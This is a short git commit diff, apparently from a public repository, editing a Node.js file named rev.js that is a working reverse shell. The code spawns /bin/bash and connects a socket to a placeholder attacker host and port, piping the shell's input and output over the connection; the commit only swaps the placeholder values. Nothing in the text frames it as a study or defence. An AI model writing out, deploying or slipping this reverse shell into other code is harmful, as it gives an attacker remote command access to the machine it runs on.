861dc3cc984b6120f08101cd4a99ef682dcee997
tyranteye <69487631+tyranteye666@users.noreply.github.com>
2021-07-10 21:05:51 +0800

    Update rev.js

--- rev.js
+++ rev.js
@@ -1,3 +1,3 @@
 var net = require("net"), sh = require("child_process").exec("/bin/bash")
 var client = new net.Socket();
-client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
+client.connect(<attckerport>, "<attackerip>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
